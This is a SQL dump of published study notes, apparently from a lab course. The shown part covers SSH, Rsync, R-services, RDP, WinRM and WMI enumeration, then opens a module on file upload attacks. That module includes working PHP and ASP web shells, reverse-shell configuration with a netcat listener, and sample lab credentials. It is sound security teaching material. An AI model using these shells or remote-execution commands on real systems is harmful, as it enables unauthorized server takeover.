| `Protocol 1` | Old vulnerable SSH version susceptible to MITM attacks |
| `X11Forwarding yes` | Allows GUI forwarding (had a command injection vulnerability in 2016 — CVE-2016-3115) |
| `AllowTcpForwarding yes` | Attackers who gain SSH access can tunnel traffic to internal network resources |
| `PermitTunnel` | Allows VPN-like tunneling through SSH — can bypass firewall rules |
| `DebianBanner yes` | Displays detailed system banner on login, revealing OS information to attackers |

---

#### Footprinting SSH with ssh-audit

```bash
git clone https://github.com/jtesta/ssh-audit.git && cd ssh-audit
./ssh-audit.py 10.129.14.132
```

**Purpose:** ssh-audit analyzes the SSH server''s configuration and cryptographic settings without requiring authentication. It checks the SSH version, supported key exchange algorithms, host key algorithms, encryption ciphers, and message authentication codes, flagging any that are weak or deprecated.

Example output:

```
# general
(gen) banner: SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3
(gen) software: OpenSSH 8.2p1
(gen) compatibility: OpenSSH 7.4+, Dropbear SSH 2018.76+
(gen) compression: enabled (zlib@openssh.com)

# key exchange algorithms
(kex) curve25519-sha256           -- [info] available since OpenSSH 7.4
(kex) ecdh-sha2-nistp256          -- [fail] using weak elliptic curves
(kex) ecdh-sha2-nistp384          -- [fail] using weak elliptic curves
(kex) diffie-hellman-group-exchange-sha256 (2048-bit) -- [info] available

# host-key algorithms
(key) rsa-sha2-512 (3072-bit)     -- [info] available since OpenSSH 7.2
(key) ssh-rsa (3072-bit)          -- [fail] using weak hashing algorithm
(key) ecdsa-sha2-nistp256         -- [fail] using weak elliptic curves
(key) ssh-ed25519                 -- [info] available since OpenSSH 6.5
```

The banner reveals the exact OpenSSH version (8.2p1) and Ubuntu version. Several algorithms are flagged as weak (NIST elliptic curves, RSA-SHA1) and should be disabled.

---

#### Verbose SSH Connection — Checking Authentication Methods

```bash
ssh -v cry0l1t3@10.129.14.132
```

**Purpose:** The `-v` (verbose) flag shows the full SSH handshake including which authentication methods the server advertises as available. This tells you what attack methods are possible.

Key output line:

```
debug1: Authentications that can continue: publickey,password,keyboard-interactive
```

This shows the server accepts three authentication methods. Password authentication being listed means brute force is possible.

#### Force Password Authentication

```bash
ssh -v cry0l1t3@10.129.14.132 -o PreferredAuthentications=password
```

**Purpose:** Forces the SSH client to only try password authentication. The `-o PreferredAuthentications=password` sets the authentication method preference. Useful when you want to test password authentication specifically or when performing brute force testing.

Output:

```
debug1: Authentications that can continue: publickey,password,keyboard-interactive
debug1: Next authentication method: password
cry0l1t3@10.129.14.132''s password:
```

---

### Rsync

#### What is Rsync?

Rsync is a file synchronization tool that uses a delta-transfer algorithm — only sending the parts of files that have changed. It uses **port 873** and can run over SSH for secure transfers. Rsync is commonly used for backups. During penetration tests, misconfigured Rsync servers may allow unauthenticated access to shared directories containing sensitive files.

#### Scan for Rsync

```bash
sudo nmap -sV -p 873 127.0.0.1
```

Example output:

```
PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)
```

#### Probe for Available Shares with Netcat

```bash
nc -nv 127.0.0.1 873
```

**Purpose:** Opens a raw TCP connection to the Rsync port. After connecting, type `#list` to see all available Rsync modules (shares).

Full interaction:

```
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
#list
dev             Dev Tools
@RSYNCD: EXIT
```

The server shows one module called "dev" with description "Dev Tools".

#### Enumerate an Open Share

```bash
rsync -av --list-only rsync://127.0.0.1/dev
```

**Purpose:** Lists all files in the "dev" Rsync module without downloading them.

- `-a` — Archive mode: preserves permissions, timestamps, symbolic links
- `-v` — Verbose output
- `--list-only` — Only list files, do not transfer anything
- `rsync://127.0.0.1/dev` — The Rsync URL format: rsync://server/module

Example output:

```
receiving incremental file list
drwxr-xr-x             48 2022/09/19 09:43:10 .
-rw-r--r--              0 2022/09/19 09:34:50 build.sh
-rw-r--r--              0 2022/09/19 09:36:02 secrets.yaml
drwx------             54 2022/09/19 09:43:10 .ssh

sent 25 bytes  received 221 bytes  492.00 bytes/sec
```

There is a `secrets.yaml` file and an `.ssh` directory (likely containing SSH keys) — immediate targets.

#### Download All Files from Share

```bash
rsync -av rsync://127.0.0.1/dev ./local-copy/
```

**Purpose:** Downloads the entire "dev" module to a local directory. Without `--list-only`, rsync actually transfers everything.

#### Rsync Over SSH

```bash
rsync -av -e ssh rsync://127.0.0.1/dev ./local-copy/
# Or for non-standard SSH port:
rsync -av -e "ssh -p2222" rsync://127.0.0.1/dev ./local-copy/
```

**Purpose:** The `-e ssh` flag tells rsync to use SSH as the transport layer, encrypting all data in transit.

---

### R-Services (Legacy Insecure Remote Access)

#### What are R-Services?

R-Services are old Unix remote access protocols developed at UC Berkeley in the 1980s. They predate SSH and were designed when security was less of a concern. They transmit ALL data including passwords in plain text and rely on trusting certain hosts rather than strong cryptographic authentication. They span ports **512** (rexec), **513** (rlogin), and **514** (rsh/rcp). They have been almost completely replaced by SSH but are occasionally still found in legacy environments.

#### R-Commands Overview

| Command | Description |
|---|---|
| `rcp` (Remote Copy) | Copies files bidirectionally between local and remote hosts. Does NOT warn about overwriting files. Uses port 514 TCP via the rshd daemon. |
| `rsh` (Remote Shell) | Opens a shell on a remote machine without going through a login procedure. Authentication bypassed using trusted host lists. Uses port 514 TCP via rshd. |
| `rexec` (Remote Execute) | Runs shell commands on a remote machine. Unlike rsh, it requires username and password — BUT sends them in plain text. Uses port 512 TCP via rexecd. |
| `rlogin` (Remote Login) | Logs into a remote Unix host over the network. Authentication can be bypassed via trusted host files. Uses port 513 TCP via rlogind. |

#### Trust Files

R-services use two files to define trusted access:

- `/etc/hosts.equiv` — System-wide trust file. Lists trusted hostnames and usernames. Any combination listed here can access the system without a password.
- `~/.rhosts` — Per-user trust file in each user''s home directory. Similar format but only affects that specific user.

Viewing `/etc/hosts.equiv`:

```bash
cat /etc/hosts.equiv
```

Output:

```
# pwnbox cry0l1t3
```

This trusts the user "cry0l1t3" coming from the host "pwnbox" — no password needed.

Example `.rhosts` file:

```
htb-student     10.0.17.5
+               10.0.17.10
+               +
```

The `+` is a wildcard meaning "any". `+ +` trusts ANYONE from ANYWHERE — completely open access, the worst possible configuration.

#### Scan for R-Services

```bash
sudo nmap -sV -p 512,513,514 10.0.17.2
```

Example output:

```
PORT    STATE SERVICE    VERSION
512/tcp open  exec?
513/tcp open  login?
514/tcp open  tcpwrapped
```

All three ports are open — R-services are running on this legacy system.

#### Login with Rlogin

```bash
rlogin 10.0.17.2 -l htb-student
```

**Purpose:** Attempts to log in to the remote host as "htb-student" using rlogin. If the `.rhosts` file trusts your machine for this user, you log in without a password.

Successful login:

```
Last login: Fri Dec  2 16:11:21 from localhost
[htb-student@localhost ~]$
```

No password was required. Access granted through the misconfigured `.rhosts` trust file.

#### List Active Users with Rwho

```bash
rwho
```

**Purpose:** The rwho (Remote Who) command queries the rwho daemon running on systems across the local network to discover all currently logged-in users.

Example output:

```
root     web01:pts/0 Dec  2 21:34
htb-student     workstn01:tty1  Dec  2 19:57  2:25
```

Shows "root" is logged into web01 (remote session) and "htb-student" is logged into workstn01 on a physical terminal with 2 hours and 25 minutes idle time.

#### Detailed User Listing with Rusers

```bash
rusers -al 10.0.17.5
```

**Purpose:** Provides more detailed information than rwho for a specific host. Shows username, hostname, TTY (terminal), login date/time, idle time, and remote host they connected from.

- `-a` — Show all users including idle ones
- `-l` — Long format (detailed output)

Example output:

```
htb-student     10.0.17.5:console          Dec 2 19:57     2:25
```

Shows htb-student logged in via the physical console at 10.0.17.5 on December 2nd, idle for 2 hours and 25 minutes.


---

## Section 17: Windows Remote Management Protocols

### RDP (Remote Desktop Protocol)

#### What is RDP?

RDP is Microsoft''s proprietary protocol for graphical remote access to Windows systems. Unlike SSH which is command-line only, RDP gives you complete control of the Windows desktop — seeing the screen and controlling mouse and keyboard — just as if you were sitting in front of it. RDP uses **TCP port 3389** (and optionally UDP 3389 for improved performance). RDP has supported TLS/SSL encryption since Windows Vista. Network Level Authentication (NLA) adds an extra layer of security by requiring authentication before the full RDP session is established, preventing unauthorized access to the login screen.

---

#### Footprinting RDP with Nmap

```bash
nmap -sV -sC 10.129.201.248 -p3389 --script rdp*
```

**Purpose:** Scans RDP port 3389 with all RDP-related NSE scripts. The `rdp*` wildcard runs `rdp-enum-encryption`, `rdp-ntlm-info`, and other RDP scripts.

Example output:

```
PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-enum-encryption:
|   Security layer
|     CredSSP (NLA): SUCCESS
|     CredSSP with Early User Auth: SUCCESS
|_    RDSTLS: SUCCESS
| rdp-ntlm-info:
|   Target_Name: ILF-SQL-01
|   NetBIOS_Domain_Name: ILF-SQL-01
|   NetBIOS_Computer_Name: ILF-SQL-01
|   DNS_Domain_Name: ILF-SQL-01
|   DNS_Computer_Name: ILF-SQL-01
|   Product_Version: 10.0.17763
|_  System_Time: 2021-11-06T13:46:00+00:00
```

The `rdp-enum-encryption` script shows NLA is supported (CredSSP SUCCESS). The `rdp-ntlm-info` script reveals the hostname (ILF-SQL-01), domain name, and Windows version (10.0.17763 = Windows Server 2019).

---

#### RDP Packet Trace

```bash
nmap -sV -sC 10.129.201.248 -p3389 --packet-trace --disable-arp-ping -n
```

**Purpose:** Adds `--packet-trace` to show all raw network packets exchanged during the scan. This reveals exactly what data is sent and received at the network level.

> **Important security note:** Nmap RDP scripts use `mstshash=nmap` as an RDP cookie. Security tools, EDR (Endpoint Detection and Response) systems, and threat hunters specifically look for this string in network traffic to identify Nmap scans. On hardened networks, this could trigger alerts and get you blocked.

---

#### Check RDP Security Settings with rdp-sec-check.pl

Installation:

```bash
sudo cpan
cpan[1]> install Encoding::BER
git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check
```

Command:

```bash
./rdp-sec-check.pl 10.129.201.248
```

**Purpose:** A Perl script that checks RDP security configurations without authenticating. It tests which security layers and encryption methods the server supports by sending specially crafted RDP handshake packets.

Example output:

```
[+] Checking supported protocols
[-] Checking if RDP Security (PROTOCOL_RDP) is supported...Not supported - HYBRID_REQUIRED_BY_SERVER
[-] Checking if TLS Security (PROTOCOL_SSL) is supported...Not supported - HYBRID_REQUIRED_BY_SERVER
[-] Checking if CredSSP Security (PROTOCOL_HYBRID) is supported [uses NLA]...Supported

[+] Summary of protocol support
[-] 10.129.201.248:3389 supports PROTOCOL_SSL   : FALSE
[-] 10.129.201.248:3389 supports PROTOCOL_HYBRID: TRUE
[-] 10.129.201.248:3389 supports PROTOCOL_RDP   : FALSE

[+] Summary of RDP encryption support
[-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_NONE   : FALSE
[-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_40BIT  : FALSE
[-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_128BIT : FALSE
[-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_FIPS   : FALSE
```

This server only supports PROTOCOL_HYBRID (NLA with CredSSP). Plain RDP and TLS without NLA are both rejected. All legacy encryption methods are disabled — a well-hardened RDP configuration.

---

#### Connect via RDP from Linux

```bash
xfreerdp /u:cry0l1t3 /p:"P455w0rd!" /v:10.129.201.248
```

**Purpose:** Initiates an RDP session from Linux using the xfreerdp client. Opens a full graphical Windows desktop window.

Flag breakdown:

- `xfreerdp` — The FreeRDP client for Linux (X11 version)
- `/u:cry0l1t3` — Username
- `/p:"P455w0rd!"` — Password (in quotes to handle special characters)
- `/v:10.129.201.248` — Target server IP

During connection, a certificate warning appears. Type `Y` to accept and proceed. After successful authentication, a Windows desktop window appears.

---

### WinRM (Windows Remote Management)

#### What is WinRM?

WinRM is a command-line remote management protocol for Windows based on the WS-Management standard. It uses SOAP (Simple Object Access Protocol) for communication and requires explicit enabling on older Windows systems. Ports used are **5985** (HTTP) and **5986** (HTTPS). WinRM is enabled by default on Windows Server 2012 and later. WinRS (Windows Remote Shell) is the client-side component that allows executing arbitrary commands on remote systems through WinRM. PowerShell remote sessions also use WinRM as their transport.

---

#### Footprinting WinRM with Nmap

```bash
nmap -sV -sC 10.129.201.248 -p5985,5986 --disable-arp-ping -n
```

**Purpose:** Scans both WinRM ports. The `--disable-arp-ping` and `-n` flags disable ARP ping and DNS resolution to speed up the scan.

Example output:

```
PORT     STATE SERVICE VERSION
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Port 5985 is open (HTTP WinRM). The server header confirms it is Windows. The "Not Found" response to a basic HTTP request is expected — WinRM uses specific SOAP endpoints, not regular web pages.

---

#### Connect with Evil-WinRM (from Linux)

```bash
evil-winrm -i 10.129.201.248 -u Cry0l1t3 -p P455w0rD!
```

**Purpose:** Evil-WinRM is a penetration testing tool designed specifically to interact with WinRM from Linux. It provides a feature-rich interactive PowerShell shell on the remote Windows system.

Flag breakdown:

- `evil-winrm` — The tool
- `-i 10.129.201.248` — Target IP address
- `-u Cry0l1t3` — Username
- `-p P455w0rD!` — Password

Successful connection:

```
Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Cry0l1t3\Documents>
```

You now have a PowerShell prompt inside the remote Windows system. You can run any PowerShell command, upload/download files, and manage the system as if sitting at it.

---

### WMI (Windows Management Instrumentation)

#### What is WMI?

WMI is Microsoft''s implementation of WBEM (Web-Based Enterprise Management) and provides nearly universal read and write access to Windows system settings. It is accessed via PowerShell, VBScript, or the command-line tool `wmic`. WMI communication starts on **TCP port 135**, then moves to a random port. This makes WMI harder to block with simple firewall rules. WMI provides read and write access to hardware, software, OS configuration, running processes, network settings, user accounts, installed applications, and much more.

---

#### Connect with wmiexec.py (Impacket)

```bash
/usr/share/doc/python3-impacket/examples/wmiexec.py Cry0l1t3:"P455w0rD!"@10.129.201.248 "hostname"
```

**Purpose:** `wmiexec.py` from the Impacket toolkit uses WMI to execute commands on remote Windows systems from Linux. It authenticates using provided credentials and runs the specified command, returning the output.

Flag breakdown:

- `/usr/share/doc/python3-impacket/examples/wmiexec.py` — Full path to the script
- `Cry0l1t3:"P455w0rD!"@10.129.201.248` — Credentials and target in format `username:password@IP`
- `"hostname"` — The Windows command to execute remotely

Example output:

```
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] SMBv3.0 dialect used
ILF-SQL-01
```

The command `hostname` was executed on the remote Windows system and returned "ILF-SQL-01" — confirming successful remote command execution via WMI. In a real penetration test, you would run more powerful commands like `whoami /all` (check privileges), `net user` (list users), or `ipconfig /all` (network configuration).

---

*These notes cover all sections completely with every command explained — its purpose, usage, flags, and how to perform each task. No content has been skipped or summarized.*', NULL, 'PUBLISHED', 'PUBLIC', 123, 'cmvcsa9i0000hidr0sh1y58oz', 'cmvcr40dj0000idhkp489xa3k', to_timestamp(1792354499.419), to_timestamp(1792354499.419), NULL, NULL)
ON CONFLICT ("slug") DO UPDATE SET "title" = EXCLUDED."title", "contentMarkdown" = EXCLUDED."contentMarkdown", "contentHtml" = EXCLUDED."contentHtml", "description" = EXCLUDED."description", "status" = EXCLUDED."status", "updatedAt" = EXCLUDED."updatedAt";
INSERT INTO "Document" ("id", "title", "slug", "description", "contentMarkdown", "contentHtml", "status", "visibility", "readingTimeMin", "categoryId", "authorId", "createdAt", "updatedAt", "publishedAt", "deletedAt")
VALUES ('cmvf2j6b80001ida0zah25e7j', 'File Upload Attacks', 'file-upload-attacks', 'Complete HTB Academy notes on file upload attacks covering absent validation, web shells, reverse shells, client-side bypass, blacklist/whitelist/type filter evasion, double extensions, null bytes, magic bytes, MIME spoofing, XSS/XXE/DoS via uploads, Windows-specific attacks, and advanced processing library exploits.', '# File Upload Attacks

---

## Table of Contents

1. [Intro to File Upload Attacks](#intro-to-file-upload-attacks)
   - [Types of File Upload Attacks](#types-of-file-upload-attacks)
2. [Absent Validation](#absent-validation)
   - [Arbitrary File Upload](#arbitrary-file-upload)
   - [Identifying Web Framework](#identifying-web-framework)
   - [Vulnerability Identification](#vulnerability-identification)
3. [Upload Exploitation](#upload-exploitation)
   - [Web Shells](#web-shells)
   - [Writing Custom Web Shell](#writing-custom-web-shell)
   - [Reverse Shell](#reverse-shell)
   - [Generating Custom Reverse Shell Scripts](#generating-custom-reverse-shell-scripts)
4. [Client-Side Validation](#client-side-validation)
   - [Back-end Request Modification](#back-end-request-modification)
   - [Disabling Front-end Validation](#disabling-front-end-validation)
5. [Blacklist Filters](#blacklist-filters)
   - [Blacklisting Extensions](#blacklisting-extensions)
   - [Fuzzing Extensions](#fuzzing-extensions)
   - [Non-Blacklisted Extensions](#non-blacklisted-extensions)
6. [Whitelist Filters](#whitelist-filters)
   - [Whitelisting Extensions](#whitelisting-extensions)
   - [Double Extensions](#double-extensions)
   - [Reverse Double Extension](#reverse-double-extension)
   - [Character Injection](#character-injection)
7. [Type Filters](#type-filters)
   - [Content-Type](#content-type)
   - [MIME-Type](#mime-type)
8. [Limited File Uploads](#limited-file-uploads)
   - [XSS](#xss)
   - [XXE](#xxe)
   - [DoS](#dos)
9. [Other Upload Attacks](#other-upload-attacks)
   - [Injections in File Name](#injections-in-file-name)
   - [Upload Directory Disclosure](#upload-directory-disclosure)
   - [Windows-specific Attacks](#windows-specific-attacks)
   - [Advanced File Upload Attacks](#advanced-file-upload-attacks)

---

## Intro to File Upload Attacks

Uploading user files has become a key feature for most modern web applications to allow the extensibility of web applications with user information. A social media website allows the upload of user profile images and other social media, while a corporate website may allow users to upload PDFs and other documents for corporate use. This feature is practically ubiquitous across the modern web — from profile pictures, to document submissions, to media sharing.

However, as web application developers enable this feature, they also take the risk of allowing end-users to store their potentially malicious data on the web application''s back-end server. If the user input and uploaded files are not correctly filtered and validated, attackers may be able to exploit the file upload feature to perform malicious activities, like executing arbitrary commands on the back-end server to take control over it. The file upload mechanism itself becomes the attack vector.

File upload vulnerabilities are amongst the most common vulnerabilities found in web and mobile applications, as evidenced by the latest CVE (Common Vulnerabilities and Exposures) Reports. These vulnerabilities consistently appear in real-world applications across all industries and technology stacks. Most of these vulnerabilities are scored as **High** or **Critical** severity, showing the level of risk caused by insecure file upload implementation.

The core problem is a trust issue: the application accepts a file from the user and stores or processes it without adequately verifying that the file is what it claims to be or that it is safe. Once an attacker can upload an arbitrary file — especially a server-side executable — the consequences can include full server compromise, lateral movement to other systems, data theft, and persistent backdoor access.

---

### Types of File Upload Attacks

The most common reason behind file upload vulnerabilities is **weak file validation and verification**, which may not be well secured to prevent unwanted file types or could be missing altogether. Validation may be absent entirely, implemented only on the client-side (bypassed trivially), or implemented poorly on the back-end using insecure blacklists or regex patterns.

The worst possible kind of file upload vulnerability is an **unauthenticated arbitrary file upload** vulnerability. With this type of vulnerability, a web application allows any unauthenticated user to upload any file type, making it one step away from allowing any user to execute code on the back-end server. No login is required, and no restrictions are in place — the attacker simply uploads and executes.

Many web developers employ various types of tests to validate the extension or content of the uploaded file. However, if these filters are not secure, we may be able to bypass them and still reach arbitrary file uploads to perform our attacks. As we will explore throughout this module, filters can be bypassed via extension manipulation, encoding, MIME spoofing, double extensions, and more.

**The most common and critical attack** caused by arbitrary file uploads is **gaining remote command execution (RCE)** over the back-end server by:
- Uploading a **web shell** — a script that accepts and executes system commands via the browser
- Uploading a **reverse shell script** — a script that initiates a connection back to the attacker''s machine

Even when arbitrary uploads are not possible and only specific file types are allowed, there are still various attacks achievable when certain security protections are missing from the web application:

- **XSS (Cross-Site Scripting)** — Injecting JavaScript into uploadable files (SVG, HTML, image metadata) to attack users who view those files
- **XXE (XML External Entity)** — Injecting malicious XML into SVG, PDF, or document files to read server files or perform SSRF
- **Denial of Service (DoS)** — Uploading decompression bombs, pixel flood images, or oversized files to crash the server
- **Overwriting critical system files and configurations** — Using directory traversal in file names or Windows 8.3 naming to overwrite sensitive files

Finally, a file upload vulnerability is not only caused by writing insecure functions but is also often caused by the **use of outdated libraries** that may be vulnerable to these attacks. At the end of the module, we will go through various tips and practices to secure web applications against the most common types of file upload attacks, in addition to further recommendations to prevent file upload vulnerabilities that we may miss.

---

## Absent Validation

The most basic type of file upload vulnerability occurs when the web application does not have **any form of validation filters** on the uploaded files, allowing the upload of any file type by default. There is no check on the file extension, file content, file size, or MIME type — the server blindly accepts and stores whatever is sent to it.

With these types of vulnerable web apps, we may directly upload our web shell or reverse shell script to the web application, and then by just visiting the uploaded script, we can interact with our web shell or send the reverse shell. There is no bypass required because there is nothing to bypass — the lack of any validation is the vulnerability itself.

This is the simplest and most severe form of file upload vulnerability. In real-world penetration tests, these are increasingly rare since modern frameworks and security awareness have improved, but they still exist — especially in older, legacy, or poorly maintained applications. When found, exploitation is direct and immediate.

---

### Arbitrary File Upload

Consider an **Employee File Manager** web application that allows users to upload personal files. The upload interface accepts files via drag-and-drop or a file selection dialog. Critically:

- The web application does not mention anything about what file types are allowed
- The file selection dialog says **"All Files"** for the file type — meaning no front-end restriction is specified
- A `.php` file can be selected and its name appears in the upload form without any warning or rejection
- Clicking "Upload" successfully uploads the file

All of these indicators tell us that the program appears to have **no file type restrictions on the front-end**, and if no restrictions were specified on the back-end either, we may be able to upload arbitrary file types to the back-end server to gain complete control over it. The combination of no front-end restriction and no back-end restriction creates a completely open upload surface.

---

### Identifying Web Framework

Before uploading a malicious script, we need to identify what **programming language and framework** the web server runs. A web shell must be written in the **same language as the web server** because it relies on that language''s built-in functions (like `system()` in PHP) to execute OS commands. A PHP web shell will not work on an ASP.NET server, and vice versa — web shells are platform-specific scripts, not cross-platform tools.

**Method 1 — Check the URL extension:**
The simplest method is to observe the URL of the web page. If the URL ends in `.php`, `.asp`, `.aspx`, `.jsp`, etc., that tells us the language. However, many modern frameworks use **URL routing** (mapping URLs to handlers without showing extensions), so the extension may not be visible.

**Method 2 — Visit /index.ext manually:**
We can visit `http://SERVER_IP:PORT/index.php`, `http://SERVER_IP:PORT/index.asp`, `http://SERVER_IP:PORT/index.aspx`, etc., and see which one returns the same page (indicating it''s the real index file). This is a quick manual fingerprinting technique.

For example, visiting `http://SERVER_IP:PORT/index.php` returns the same page as `http://SERVER_IP:PORT/` — confirming this is a PHP application.

We do not need to do this manually; we can use **Burp Intruder** to fuzz the file extension automatically using a **Web Extensions wordlist**, trying dozens of extensions quickly and seeing which returns a valid response.

**Method 3 — Wappalyzer browser extension:**
Wappalyzer is a browser extension available for all major browsers (Chrome, Firefox) that automatically detects the technology stack of any website you visit. Clicking its icon shows:
- The server-side language (e.g., PHP)
- The web server type and version (e.g., Apache 2.4)
- The operating system (e.g., Ubuntu)
- JavaScript libraries (e.g., jQuery)
- CMS or framework (e.g., WordPress, Laravel)

This provides comprehensive fingerprinting in one click. It is an essential tool in a web penetration tester''s arsenal. However, it is always better to know alternative manual methods as well, since automated tools can sometimes be wrong or incomplete.

**Method 4 — Web vulnerability scanners:**
Tools like **Burp Scanner**, **OWASP ZAP**, **Nikto**, or other web vulnerability assessment tools can scan a web application and identify its technology stack, exposed headers, cookies, and other fingerprinting signals. These scanners automate what would otherwise be a lengthy manual process.

Once the programming language is identified, we can upload a malicious script written in the same language to exploit the web application and gain remote control over the back-end server.

---

### Vulnerability Identification

After identifying the web framework (PHP in our example), the next step is to **confirm whether arbitrary file uploads are possible** by uploading a test script. Rather than immediately uploading a full web shell, we start with a simple proof-of-concept to confirm code execution.

**Test Script — PHP Hello World:**

Write `<?php echo "Hello HTB";?>` to a file called `test.php`:

```php
<?php echo "Hello HTB"; ?>
```

**What this does:**
- `<?php` — Opens a PHP code block
- `echo "Hello HTB";` — Outputs the string "Hello HTB" to the HTTP response
- `?>` — Closes the PHP code block

Upload `test.php` to the web application. If the upload succeeds (e.g., we see "File successfully uploaded"), it means the back-end has **no file validation whatsoever**.

**Visiting the uploaded file:**

```
http://SERVER_IP:PORT/uploads/test.php
```

If the page displays `Hello HTB`, it means the `echo` function was **executed** — PHP code ran on the back-end server. This is direct confirmation that:
1. The file was uploaded successfully
2. The file is stored in the `/uploads/` directory (or similar)
3. The file is accessible and executable via its URL
4. We have confirmed remote PHP code execution

If the file was not executed (but instead shown as source code), it would mean PHP execution is not enabled for the upload directory — even if the upload succeeded, we couldn''t execute code. But if `Hello HTB` is printed, we have full PHP execution, and the next step is uploading a real web shell.

---

## Upload Exploitation

The final step in exploiting this web application is to upload the **malicious script** in the same language as the web application — either a web shell or a reverse shell script. Once we upload our malicious script and visit its link, we can interact with it to take control over the back-end server.

---

### Web Shells

A **web shell** is a script uploaded to a vulnerable web server that provides an attacker with the ability to execute OS commands through the web browser. The attacker sends an HTTP request containing the desired command, and the web shell executes it on the server and returns the output in the HTTP response — all through a normal web page.

We can find many excellent web shells online that provide useful features, like directory traversal or file transfer:

- **phpbash** — Provides a terminal-like, semi-interactive web shell for PHP. It mimics a real bash terminal in the browser, making enumeration intuitive and easy.
- **SecLists web shells** — SecLists (`/opt/useful/seclists/Web-Shells`) provides a collection of web shells for different frameworks and languages including PHP, ASP, ASPX, JSP, and others.

**Using phpbash:**

Upload `phpbash.php` through the vulnerable upload form, then navigate to its URL by clicking the Download/View button:

```
http://SERVER_IP:PORT/uploads/phpbash.php
```

This provides a terminal-like experience directly in the browser, showing the current user (`www-data`), UID, GID, and the current working directory. From here, we can run any Linux command: `ls`, `cat`, `whoami`, `uname -a`, `ifconfig`, etc. This is extremely useful for enumerating the back-end server for further exploitation — reading config files, finding credentials, identifying installed software, and mapping the network.

---

### Writing Custom Web Shell

Although using web shells from online resources provides a great experience, we must know how to write a simple web shell manually. This is because we may not have access to online tools during some penetration tests, so we need to be able to create one when needed. A custom web shell can also be adapted to bypass security controls that might block well-known web shell signatures.

**Custom PHP Web Shell:**

```php
<?php system($_REQUEST[''cmd'']); ?>
```

**Code Breakdown:**
- `<?php` — Opens the PHP code block
- `system()` — A built-in PHP function that executes the given command as if typed directly in a system shell (bash/sh on Linux, cmd.exe on Windows) and **prints the output** to the browser
- `$_REQUEST[''cmd'']` — Retrieves the value of the `cmd` parameter from either GET or POST request data. `$_REQUEST` is a PHP superglobal that combines `$_GET`, `$_POST`, and `$_COOKIE` — making the shell accessible via both GET and POST requests
- `?>` — Closes the PHP code block

**Writing the shell to a file:**

```bash
echo ''<?php system($_REQUEST["cmd"]); ?>'' > shell.php
```

Upload `shell.php` to the web application, then interact with it by appending `?cmd=<command>` to the URL:

```
http://SERVER_IP:PORT/uploads/shell.php?cmd=id
```

**How this works:**
- The browser sends a GET request to `/uploads/shell.php` with `cmd=id`
- PHP executes `system(''id'')` on the server
- The `id` command output (UID, GID, groups) is printed to the HTTP response and displayed in the browser

**Output Example:**

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Tip:** When using this custom web shell in a browser, use **source-view** by clicking `CTRL+U`. The source view shows the command output as it would appear in a terminal, without HTML rendering that may format or mangle the output (especially useful for multi-line command output).

**Web shells are not exclusive to PHP.** The same concept applies to other frameworks with different syntax:

**ASP/.NET Web Shell:**

```asp
<% eval request(''cmd'') %>
```

**Code Breakdown:**
- `<%` — Opens an ASP/ASP.NET code block
- `eval` — Evaluates and executes the given expression as code
- `request(''cmd'')` — Retrieves the `cmd` parameter from the HTTP request
- `%>` — Closes the code block

This works identically to the PHP version — append `?cmd=whoami` to the URL and it executes the command and returns the output.

**Note:** In certain cases, web shells may not work. This may be due to the web server preventing the use of certain functions (e.g., `system()` may be disabled in `php.ini` via `disable_functions`), or due to a **Web Application Firewall (WAF)** blocking shell-like patterns. In these cases, more advanced techniques are needed to bypass these security mitigations.

---

### Reverse Shell

A **reverse shell** is a type of shell where the **target server initiates the connection back to the attacker''s machine**, rather than the attacker connecting to the server. This is preferred over web shells because:
- It provides a fully interactive shell session (just like SSH)
- It bypasses inbound firewall rules (since the connection is outbound from the server''s perspective)
- It allows running interactive programs and commands that require a TTY
- It is more powerful and flexible for post-exploitation

**Steps to obtain a reverse shell:**

**Step 1 — Download a reverse shell script:**

A reliable PHP reverse shell is the **pentestmonkey PHP reverse shell**. SecLists also contains reverse shell scripts for various languages and web frameworks. Download a reverse shell script for PHP.

**Step 2 — Configure the reverse shell with your IP and port:**

Open the script in a text editor and modify the connection parameters. For pentestmonkey, edit lines 49 and 50:

```php
$ip = ''OUR_IP'';     // CHANGE THIS — your attacking machine''s IP address
$port = OUR_PORT;   // CHANGE THIS — the port your listener will be on
```

Replace `OUR_IP` with your machine''s actual IP address (e.g., `10.10.14.5`) and `OUR_PORT` with the port number you want to receive the connection on (e.g., `4444`).

**Step 3 — Start a netcat listener on your machine:**

```bash
nc -lvnp OUR_PORT
```

**Command Breakdown:**
- `nc` — Netcat, a versatile networking utility for reading and writing data across network connections
- `-l` — Listen mode: tells netcat to wait for incoming connections instead of initiating one
- `-v` — Verbose mode: displays connection details when a connection is made
- `-n` — Numeric only: disables DNS resolution (faster, no reverse DNS lookups)
- `-p OUR_PORT` — Specifies the port number to listen on (e.g., `-p 4444`)

The listener is now waiting. Any connection coming in on `OUR_PORT` will be caught and a shell session will be established.

**Step 4 — Upload the reverse shell and trigger it:**

Upload the modified reverse shell script via the vulnerable upload form, then navigate to its URL (click Download/View button). When PHP executes the script, it connects back to your netcat listener.

**Expected Output (on attacker machine):**

```bash
nc -lvnp OUR_PORT
listening on [any] OUR_PORT ...
connect to [OUR_IP] from (UNKNOWN) [188.166.173.208] 35232
# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We successfully received a connection back from the back-end server. We now have an interactive shell where we can type commands and get responses in real time — just like an SSH session. The same concept works for other web frameworks and languages, with the only difference being the reverse shell script used.

---

### Generating Custom Reverse Shell Scripts

